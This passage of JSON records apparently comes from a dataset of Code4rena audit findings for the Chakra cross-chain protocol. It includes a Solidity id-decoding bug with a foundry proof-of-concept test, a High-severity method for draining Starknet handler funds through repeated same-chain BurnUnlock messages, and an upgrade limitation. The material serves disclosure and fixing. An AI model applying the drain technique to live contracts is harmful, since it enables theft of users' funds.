uint8(bytes1(_msg[PACKET_VERSION_OFFSET:ID_OFFSET]));\n     }\n\n-    function id(bytes calldata _msg) internal pure returns (uint64) {\n-        return uint64(bytes8(_msg[ID_OFFSET:PAYLOAD_TYPE_OFFSET]));\n+    function id(bytes calldata _msg) internal pure returns (uint256) {\n+        return uint256(bytes32(_msg[ID_OFFSET:PAYLOAD_TYPE_OFFSET]));\n     }\n\n     function payload_type(\n```\n\n\n\n## Assessed type\n\nen/de-code\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/libraries/MessageV1Codec.sol#L76-L78\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/handler/contracts/libraries/MessageV1Codec.sol#L56-L58\n\n\n# Vulnerability details\n\n## Impact\nInside of the library `MessageV1Codec` used inside the [solidity handler](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/libraries/MessageV1Codec.sol) and [solidity settlement](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/libraries/MessageV1Codec.sol) contracts, the library function will read the id of a msg from the encoded bytes.\n\nThe function is not implemented correctly. The issue is caused by the incorrect casting of the sliced part of the msg to an byte8, as the sliced part is 32 bytes long. This casting will only look at the first 8 bits. This means that it will return 0 for any id that does not use those highest 8 bits (number is less than type(uint248).max). For numbers greater than this, it will return the integer value of those 8 bits. This will not match the correct id.\n\nThis would lead to issues for any contract that relies on reading the msg id. As library code is intended to be reused in many places, it is especially important to have no issues in those. As later contracts might also use those library, the possible damage can not be estimated directly by the current usage. Therefor the issue should be considered a high risk.\n\n\n## Proof of Concept\nLooking at [function id](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/libraries/MessageV1Codec.sol#L76-L78):\n\nAn example msg would be: `Message(1, PayloadType.Raw, \"0x1234\")`. The encoded bytes would be: `0x01000000000000000000000000000000000000000000000000000000000000000100307831323334`. The function first slices the correct part of the msg by doing `_msg[ID_OFFSET:PAYLOAD_TYPE_OFFSET]`. This will return `0000000000000000000000000000000000000000000000000000000000000001` for this example. By casting it to a byte8 next, it will be `00` and the function will return 0.\n\nBelow is a poc in foundry. The test creates a helper contract that uses the library to read the id from an encoded msg. In the `test_readID` test, it creates a msg with id 1. It encodes the msg and calls the helper function to read the id. The test will fail as the returned number is zero and not one.\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\nimport {Test, console} from \"forge-std/Test.sol\";\n\nimport {MessageV1Codec} from \"../contracts/libraries/MessageV1Codec.sol\";\nimport {Message, PayloadType} from \"../contracts/libraries/Message.sol\";\n\ncontract Helper {\n    function readID(bytes calldata encoded) public returns (uint64) {\n        return MessageV1Codec.id(encoded);\n    }\n}\n\ncontract POCTest is Test {\n    Helper h;\n\n    function setUp() public {\n        h = new Helper();\n    }\n\n    function test_readID() public {\n        Message memory test_msg = Message(1, PayloadType.Raw, \"0x1234\");\n        bytes memory encoded = MessageV1Codec.encode(test_msg);\n        assertEq(h.readID(encoded), test_msg.id);\n    }\n}\n```\n\n## Tools Used\nmanual review\n\n## Recommended Mitigation Steps\nThe library assumes the id is of type uint64. Change the function to use the correct size of uint256 as defined in the [Message type](https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/solidity/settlement/contracts/libraries/Message.sol#L23-L30). For example like this:\n```diff\n--- a/MessageV1Codec.sol.orig\n+++ b/MessageV1Codec.sol\n@@ -53,8 +53,8 @@ library MessageV1Codec {\n         return uint8(bytes1(_msg[PACKET_VERSION_OFFSET:ID_OFFSET]));\n     }\n\n-    function id(bytes calldata _msg) internal pure returns (uint64) {\n-        return uint64(bytes8(_msg[ID_OFFSET:PAYLOAD_TYPE_OFFSET]));\n+    function id(bytes calldata _msg) internal pure returns (uint256) {\n+        return uint256(bytes32(_msg[ID_OFFSET:PAYLOAD_TYPE_OFFSET]));\n     }\n\n     function payload_type(\n```\n\n\n\n## Assessed type\n\nen/de-code"}, "severity": null, "difficulty": null, "type": "qa", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": null, "Difficulty": null, "Type": "qa", "Finding ID": null, "Target": null, "Severity_normalized": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-162", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 162, "page_start": null, "title": "Forcing Starknet handlers to be whitlisted on the same chain allows exploit of `BurnUnlock` mode to drain handler funds", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L115\n\n\n# Vulnerability details\n\n## Impact\nIn Cairo contracts, when handling cross-chain messages or callbacks, the contract ensures that the handler on the same chain (Starknet) is whitelisted:\n```rs\nfn receive_cross_chain_msg(ref self: ContractState, cross_chain_msg_id: u256, from_chain: felt252, to_chain: felt252,\n    from_handler: u256, to_handler: ContractAddress, payload: Array<u8>) -> bool{\n\n        assert(to_handler == get_contract_address(),\"error to_handler\");\n        assert(self.settlement_address.read() == get_caller_address(), \"not settlement\");\n        assert(self.support_handler.read((from_chain, from_handler)) &&\n>>>            self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), \"not support handler\");\n    // --SNIP\n}\n\nfn receive_cross_chain_callback(ref self: ContractState, cross_chain_msg_id: felt252, from_chain: felt252, to_chain: felt252,\n    from_handler: u256, to_handler: ContractAddress, cross_chain_msg_status: u8) -> bool{\n\n        assert(to_handler == get_contract_address(),\"error to_handler\");\n        assert(self.settlement_address.read() == get_caller_address(), \"not settlement\");\n        assert(self.support_handler.read((from_chain, from_handler)) &&\n>>>            self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), \"not support handler\");\n    // --SNIP\n\n}\n```\nIn this context, handlers on Starknet **must** whitelist themselves as supported handlers. However, this introduces a significant vulnerability: since handlers are self-whitelisted, a malicious user could send cross-chain messages to the same chain (Starknet to Starknet) and exploit the `BurnUnlock` mode as follows:\n\nIn `BurnUnlock` mode, when a cross-chain message is sent, the user's tokens are burned, and when the message is received, the same amount of tokens is unlocked. This opens the door for malicious actors to repeatedly send cross-chain messages to themselves, resulting in a continuous unlock of tokens:\n```rs\nfn receive_cross_chain_msg(ref self: ContractState, cross_chain_msg_id: u256, from_chain: felt252, to_chain: felt252,\n    from_handler: u256, to_handler: ContractAddress, payload: Array<u8>) -> bool{\n\n        // --SNIP\n        let erc20 = IERC20MintDispatcher{contract_address: self.token_address.read()};\n        let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n        if self.mode.read() == SettlementMode::MintBurn{\n            erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n        }else if self.mode.read() == SettlementMode::LockMint{\n            erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n        }else if self.mode.read() == SettlementMode::BurnUnlock{\n>>>            token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n        }else if self.mode.read() == SettlementMode::LockUnlock{\n            token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n        }\n}\n```\nBy continuously sending cross-chain messages to the same chain, the malicious user can drain the handler's funds by repeatedly unlocking tokens to their own address. As a result, other legitimate cross-chain ERC20 operations will fail due to the depletion of ERC20 tokens in the handler contract.\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nThe self-whitelisting of handlers introduces unnecessary risk and facilitates the aforementioned vulnerability. Consider removing the check that forces handlers to be self-whitelisted:\n```diff\nfn receive_cross_chain_msg(ref self: ContractState, cross_chain_msg_id: u256, from_chain: felt252, to_chain: felt252,\n    from_handler: u256, to_handler: ContractAddress, payload: Array<u8>) -> bool{\n\n        assert(to_handler == get_contract_address(),\"error to_handler\");\n        assert(self.settlement_address.read() == get_caller_address(), \"not settlement\");\n        assert(self.support_handler.read((from_chain, from_handler))\n-            && self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), \"not support handler\");\n    // --SNIP\n}\n\n\nfn receive_cross_chain_callback(ref self: ContractState, cross_chain_msg_id: felt252, from_chain: felt252, to_chain: felt252,\n    from_handler: u256, to_handler: ContractAddress, cross_chain_msg_status: u8) -> bool{\n\n        assert(to_handler == get_contract_address(),\"error to_handler\");\n        assert(self.settlement_address.read() == get_caller_address(), \"not settlement\");\n        assert(self.support_handler.read((from_chain, from_handler))\n-           && self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), \"not support handler\");\n    // --SNIP\n\n}\n```\n\n\n## Assessed type\n\nInvalid Validation\n", "sections": {"description_md": null, "impact_md": "## Impact\nIn Cairo contracts, when handling cross-chain messages or callbacks, the contract ensures that the handler on the same chain (Starknet) is whitelisted:\n```rs\nfn receive_cross_chain_msg(ref self: ContractState, cross_chain_msg_id: u256, from_chain: felt252, to_chain: felt252,\n    from_handler: u256, to_handler: ContractAddress, payload: Array<u8>) -> bool{\n\n        assert(to_handler == get_contract_address(),\"error to_handler\");\n        assert(self.settlement_address.read() == get_caller_address(), \"not settlement\");\n        assert(self.support_handler.read((from_chain, from_handler)) &&\n>>>            self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), \"not support handler\");\n    // --SNIP\n}\n\nfn receive_cross_chain_callback(ref self: ContractState, cross_chain_msg_id: felt252, from_chain: felt252, to_chain: felt252,\n    from_handler: u256, to_handler: ContractAddress, cross_chain_msg_status: u8) -> bool{\n\n        assert(to_handler == get_contract_address(),\"error to_handler\");\n        assert(self.settlement_address.read() == get_caller_address(), \"not settlement\");\n        assert(self.support_handler.read((from_chain, from_handler)) &&\n>>>            self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), \"not support handler\");\n    // --SNIP\n\n}\n```\nIn this context, handlers on Starknet **must** whitelist themselves as supported handlers. However, this introduces a significant vulnerability: since handlers are self-whitelisted, a malicious user could send cross-chain messages to the same chain (Starknet to Starknet) and exploit the `BurnUnlock` mode as follows:\n\nIn `BurnUnlock` mode, when a cross-chain message is sent, the user's tokens are burned, and when the message is received, the same amount of tokens is unlocked. This opens the door for malicious actors to repeatedly send cross-chain messages to themselves, resulting in a continuous unlock of tokens:\n```rs\nfn receive_cross_chain_msg(ref self: ContractState, cross_chain_msg_id: u256, from_chain: felt252, to_chain: felt252,\n    from_handler: u256, to_handler: ContractAddress, payload: Array<u8>) -> bool{\n\n        // --SNIP\n        let erc20 = IERC20MintDispatcher{contract_address: self.token_address.read()};\n        let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n        if self.mode.read() == SettlementMode::MintBurn{\n            erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n        }else if self.mode.read() == SettlementMode::LockMint{\n            erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n        }else if self.mode.read() == SettlementMode::BurnUnlock{\n>>>            token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n        }else if self.mode.read() == SettlementMode::LockUnlock{\n            token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n        }\n}\n```\nBy continuously sending cross-chain messages to the same chain, the malicious user can drain the handler's funds by repeatedly unlocking tokens to their own address. As a result, other legitimate cross-chain ERC20 operations will fail due to the depletion of ERC20 tokens in the handler contract.\n", "recommendation_md": "## Recommended Mitigation Steps\nThe self-whitelisting of handlers introduces unnecessary risk and facilitates the aforementioned vulnerability. Consider removing the check that forces handlers to be self-whitelisted:\n```diff\nfn receive_cross_chain_msg(ref self: ContractState, cross_chain_msg_id: u256, from_chain: felt252, to_chain: felt252,\n    from_handler: u256, to_handler: ContractAddress, payload: Array<u8>) -> bool{\n\n        assert(to_handler == get_contract_address(),\"error to_handler\");\n        assert(self.settlement_address.read() == get_caller_address(), \"not settlement\");\n        assert(self.support_handler.read((from_chain, from_handler))\n-            && self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), \"not support handler\");\n    // --SNIP\n}\n\n\nfn receive_cross_chain_callback(ref self: ContractState, cross_chain_msg_id: felt252, from_chain: felt252, to_chain: felt252,\n    from_handler: u256, to_handler: ContractAddress, cross_chain_msg_status: u8) -> bool{\n\n        assert(to_handler == get_contract_address(),\"error to_handler\");\n        assert(self.settlement_address.read() == get_caller_address(), \"not settlement\");\n        assert(self.support_handler.read((from_chain, from_handler))\n-           && self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), \"not support handler\");\n    // --SNIP\n\n}\n```\n\n\n## Assessed type\n\nInvalid Validation\n", "poc_md": null, "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L115\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManual Review\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L115\n\n\n# Vulnerability details\n\n## Impact\nIn Cairo contracts, when handling cross-chain messages or callbacks, the contract ensures that the handler on the same chain (Starknet) is whitelisted:\n```rs\nfn receive_cross_chain_msg(ref self: ContractState, cross_chain_msg_id: u256, from_chain: felt252, to_chain: felt252,\n    from_handler: u256, to_handler: ContractAddress, payload: Array<u8>) -> bool{\n\n        assert(to_handler == get_contract_address(),\"error to_handler\");\n        assert(self.settlement_address.read() == get_caller_address(), \"not settlement\");\n        assert(self.support_handler.read((from_chain, from_handler)) &&\n>>>            self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), \"not support handler\");\n    // --SNIP\n}\n\nfn receive_cross_chain_callback(ref self: ContractState, cross_chain_msg_id: felt252, from_chain: felt252, to_chain: felt252,\n    from_handler: u256, to_handler: ContractAddress, cross_chain_msg_status: u8) -> bool{\n\n        assert(to_handler == get_contract_address(),\"error to_handler\");\n        assert(self.settlement_address.read() == get_caller_address(), \"not settlement\");\n        assert(self.support_handler.read((from_chain, from_handler)) &&\n>>>            self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), \"not support handler\");\n    // --SNIP\n\n}\n```\nIn this context, handlers on Starknet **must** whitelist themselves as supported handlers. However, this introduces a significant vulnerability: since handlers are self-whitelisted, a malicious user could send cross-chain messages to the same chain (Starknet to Starknet) and exploit the `BurnUnlock` mode as follows:\n\nIn `BurnUnlock` mode, when a cross-chain message is sent, the user's tokens are burned, and when the message is received, the same amount of tokens is unlocked. This opens the door for malicious actors to repeatedly send cross-chain messages to themselves, resulting in a continuous unlock of tokens:\n```rs\nfn receive_cross_chain_msg(ref self: ContractState, cross_chain_msg_id: u256, from_chain: felt252, to_chain: felt252,\n    from_handler: u256, to_handler: ContractAddress, payload: Array<u8>) -> bool{\n\n        // --SNIP\n        let erc20 = IERC20MintDispatcher{contract_address: self.token_address.read()};\n        let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n        if self.mode.read() == SettlementMode::MintBurn{\n            erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n        }else if self.mode.read() == SettlementMode::LockMint{\n            erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n        }else if self.mode.read() == SettlementMode::BurnUnlock{\n>>>            token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n        }else if self.mode.read() == SettlementMode::LockUnlock{\n            token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n        }\n}\n```\nBy continuously sending cross-chain messages to the same chain, the malicious user can drain the handler's funds by repeatedly unlocking tokens to their own address. As a result, other legitimate cross-chain ERC20 operations will fail due to the depletion of ERC20 tokens in the handler contract.\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nThe self-whitelisting of handlers introduces unnecessary risk and facilitates the aforementioned vulnerability. Consider removing the check that forces handlers to be self-whitelisted:\n```diff\nfn receive_cross_chain_msg(ref self: ContractState, cross_chain_msg_id: u256, from_chain: felt252, to_chain: felt252,\n    from_handler: u256, to_handler: ContractAddress, payload: Array<u8>) -> bool{\n\n        assert(to_handler == get_contract_address(),\"error to_handler\");\n        assert(self.settlement_address.read() == get_caller_address(), \"not settlement\");\n        assert(self.support_handler.read((from_chain, from_handler))\n-            && self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), \"not support handler\");\n    // --SNIP\n}\n\n\nfn receive_cross_chain_callback(ref self: ContractState, cross_chain_msg_id: felt252, from_chain: felt252, to_chain: felt252,\n    from_handler: u256, to_handler: ContractAddress, cross_chain_msg_status: u8) -> bool{\n\n        assert(to_handler == get_contract_address(),\"error to_handler\");\n        assert(self.settlement_address.read() == get_caller_address(), \"not settlement\");\n        assert(self.support_handler.read((from_chain, from_handler))\n-           && self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), \"not support handler\");\n    // --SNIP\n\n}\n```\n\n\n## Assessed type\n\nInvalid Validation\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L115\n\n\n# Vulnerability details\n\n## Impact\nIn Cairo contracts, when handling cross-chain messages or callbacks, the contract ensures that the handler on the same chain (Starknet) is whitelisted:\n```rs\nfn receive_cross_chain_msg(ref self: ContractState, cross_chain_msg_id: u256, from_chain: felt252, to_chain: felt252,\n    from_handler: u256, to_handler: ContractAddress, payload: Array<u8>) -> bool{\n\n        assert(to_handler == get_contract_address(),\"error to_handler\");\n        assert(self.settlement_address.read() == get_caller_address(), \"not settlement\");\n        assert(self.support_handler.read((from_chain, from_handler)) && \n>>>            self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), \"not support handler\");\n    // --SNIP\n}\n\nfn receive_cross_chain_callback(ref self: ContractState, cross_chain_msg_id: felt252, from_chain: felt252, to_chain: felt252,\n    from_handler: u256, to_handler: ContractAddress, cross_chain_msg_status: u8) -> bool{\n        \n        assert(to_handler == get_contract_address(),\"error to_handler\");\n        assert(self.settlement_address.read() == get_caller_address(), \"not settlement\");\n        assert(self.support_handler.read((from_chain, from_handler)) && \n>>>            self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), \"not support handler\");\n    // --SNIP\n\n}\n```\nIn this context, handlers on Starknet **must** whitelist themselves as supported handlers. However, this introduces a significant vulnerability: since handlers are self-whitelisted, a malicious user could send cross-chain messages to the same chain (Starknet to Starknet) and exploit the `BurnUnlock` mode as follows:\n\nIn `BurnUnlock` mode, when a cross-chain message is sent, the user's tokens are burned, and when the message is received, the same amount of tokens is unlocked. This opens the door for malicious actors to repeatedly send cross-chain messages to themselves, resulting in a continuous unlock of tokens:\n```rs\nfn receive_cross_chain_msg(ref self: ContractState, cross_chain_msg_id: u256, from_chain: felt252, to_chain: felt252,\n    from_handler: u256, to_handler: ContractAddress, payload: Array<u8>) -> bool{\n\n        // --SNIP\n        let erc20 = IERC20MintDispatcher{contract_address: self.token_address.read()};\n        let token = IERC20Dispatcher{contract_address: self.token_address.read()};\n        if self.mode.read() == SettlementMode::MintBurn{\n            erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n        }else if self.mode.read() == SettlementMode::LockMint{\n            erc20.mint_to(u256_to_contract_address(transfer.to), transfer.amount);\n        }else if self.mode.read() == SettlementMode::BurnUnlock{\n>>>            token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n        }else if self.mode.read() == SettlementMode::LockUnlock{\n            token.transfer(u256_to_contract_address(transfer.to), transfer.amount);\n        }\n}\n```\nBy continuously sending cross-chain messages to the same chain, the malicious user can drain the handler's funds by repeatedly unlocking tokens to their own address. As a result, other legitimate cross-chain ERC20 operations will fail due to the depletion of ERC20 tokens in the handler contract.\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nThe self-whitelisting of handlers introduces unnecessary risk and facilitates the aforementioned vulnerability. Consider removing the check that forces handlers to be self-whitelisted:\n```diff\nfn receive_cross_chain_msg(ref self: ContractState, cross_chain_msg_id: u256, from_chain: felt252, to_chain: felt252,\n    from_handler: u256, to_handler: ContractAddress, payload: Array<u8>) -> bool{\n\n        assert(to_handler == get_contract_address(),\"error to_handler\");\n        assert(self.settlement_address.read() == get_caller_address(), \"not settlement\");\n        assert(self.support_handler.read((from_chain, from_handler)) \n-            && self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), \"not support handler\");\n    // --SNIP\n}\n\n\nfn receive_cross_chain_callback(ref self: ContractState, cross_chain_msg_id: felt252, from_chain: felt252, to_chain: felt252,\n    from_handler: u256, to_handler: ContractAddress, cross_chain_msg_status: u8) -> bool{\n        \n        assert(to_handler == get_contract_address(),\"error to_handler\");\n        assert(self.settlement_address.read() == get_caller_address(), \"not settlement\");\n        assert(self.support_handler.read((from_chain, from_handler)) \n-           && self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), \"not support handler\");\n    // --SNIP\n\n}\n```\n\n\n## Assessed type\n\nInvalid Validation"}, "severity": "High", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "High"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-163", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 163, "page_start": null, "title": "The `upgrade()` function does not execute a constructor", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/ckr_btc.cairo#L227\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L265\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L490\n\n\n# Vulnerability details\n\n## Vulnerability details\n\nThe current upgrade mechanism in Cairo utilizes the `replace_class_syscall()` function as it is stated in the [OpenZeppelin Cairo Contracts repository](https://github.com/OpenZeppelin/cairo-contracts/blob/release-v0.14.0/src/upgrades/upgradeable.cairo#L45). This `replace_class_syscall()` function is invoked when `self.upgradeable.upgrade(new_class_hash)` is called, which is essentially present in all `upgrade()` functions within the protocol. However, this system call does not trigger the execution of the constructor, complicating the process of updating storage variables and potentially leading to a temporary denial of service if such updates are required.\n\n\n## Impact\n\nAs the `replace_class_syscall()` does not invoke the constructor, it is not feasible to directly update storage variables during an upgrade, potentially leading to disruptions in contract functionality.\n\n## Tools Used\n\nManual Review\n\n## Recommended Mitigation Steps\n\nResearch into StarkNet forums and expert discussions has confirmed that this issue is a known limitation in Cairo upgrades. As a potential solution, it is recommended to implement a temporary class with an initialization function to manage the necessary storage updates during the upgrade process.\n\nFor further reference, here is the explanation given by Spearbit on this specific matter: https://www.youtube.com/watch?v=9CIhHNrliW4&t=2086s\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nUpgradable\n", "sections": {"description_md": null, "impact_md": "## Impact\n\nAs the `replace_class_syscall()` does not invoke the constructor, it is not feasible to directly update storage variables during an upgrade, potentially leading to disruptions in contract functionality.\n", "recommendation_md": "## Recommended Mitigation Steps\n\nResearch into StarkNet forums and expert discussions has confirmed that this issue is a known limitation in Cairo upgrades. As a potential solution, it is recommended to implement a temporary class with an initialization function to manage the necessary storage updates during the upgrade process.\n\nFor further reference, here is the explanation given by Spearbit on this specific matter: https://www.youtube.com/watch?v=9CIhHNrliW4&t=2086s\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nUpgradable\n", "poc_md": null, "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/ckr_btc.cairo#L227\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L265\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L490\n\n**container:**\n# Vulnerability details\n## Vulnerability details\n\nThe current upgrade mechanism in Cairo utilizes the `replace_class_syscall()` function as it is stated in the [OpenZeppelin Cairo Contracts repository](https://github.com/OpenZeppelin/cairo-contracts/blob/release-v0.14.0/src/upgrades/upgradeable.cairo#L45). This `replace_class_syscall()` function is invoked when `self.upgradeable.upgrade(new_class_hash)` is called, which is essentially present in all `upgrade()` functions within the protocol. However, this system call does not trigger the execution of the constructor, complicating the process of updating storage variables and potentially leading to a temporary denial of service if such updates are required.\n\n**tools_used:**\n## Tools Used\n\nManual Review\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/ckr_btc.cairo#L227\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L265\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L490\n\n\n# Vulnerability details\n\n## Vulnerability details\n\nThe current upgrade mechanism in Cairo utilizes the `replace_class_syscall()` function as it is stated in the [OpenZeppelin Cairo Contracts repository](https://github.com/OpenZeppelin/cairo-contracts/blob/release-v0.14.0/src/upgrades/upgradeable.cairo#L45). This `replace_class_syscall()` function is invoked when `self.upgradeable.upgrade(new_class_hash)` is called, which is essentially present in all `upgrade()` functions within the protocol. However, this system call does not trigger the execution of the constructor, complicating the process of updating storage variables and potentially leading to a temporary denial of service if such updates are required.\n\n\n## Impact\n\nAs the `replace_class_syscall()` does not invoke the constructor, it is not feasible to directly update storage variables during an upgrade, potentially leading to disruptions in contract functionality.\n\n## Tools Used\n\nManual Review\n\n## Recommended Mitigation Steps\n\nResearch into StarkNet forums and expert discussions has confirmed that this issue is a known limitation in Cairo upgrades. As a potential solution, it is recommended to implement a temporary class with an initialization function to manage the necessary storage updates during the upgrade process.\n\nFor further reference, here is the explanation given by Spearbit on this specific matter: https://www.youtube.com/watch?v=9CIhHNrliW4&t=2086s\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nUpgradable\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/ckr_btc.cairo#L227\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L265\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/settlement.cairo#L490\n\n\n# Vulnerability details\n\n## Vulnerability details\n\nThe current upgrade mechanism in Cairo utilizes the `replace_class_syscall()` function as it is stated in the [OpenZeppelin Cairo Contracts repository](https://github.com/OpenZeppelin/cairo-contracts/blob/release-v0.14.0/src/upgrades/upgradeable.cairo#L45). This `replace_class_syscall()` function is invoked when `self.upgradeable.upgrade(new_class_hash)` is called, which is essentially present in all `upgrade()` functions within the protocol. However, this system call does not trigger the execution of the constructor, complicating the process of updating storage variables and potentially leading to a temporary denial of service if such updates are required.\n\n\n## Impact\n\nAs the `replace_class_syscall()` does not invoke the constructor, it is not feasible to directly update storage variables during an upgrade, potentially leading to disruptions in contract functionality.\n\n## Tools Used\n\nManual Review\n\n## Recommended Mitigation Steps\n\nResearch into StarkNet forums and expert discussions has confirmed that this issue is a known limitation in Cairo upgrades. As a potential solution, it is recommended to implement a temporary class with an initialization function to manage the necessary storage updates during the upgrade process.\n\nFor further reference, here is the explanation given by Spearbit on this specific matter: https://www.youtube.com/watch?v=9CIhHNrliW4&t=2086s\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nUpgradable"}, "severity": null, "difficulty": null, "type": "qa", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": 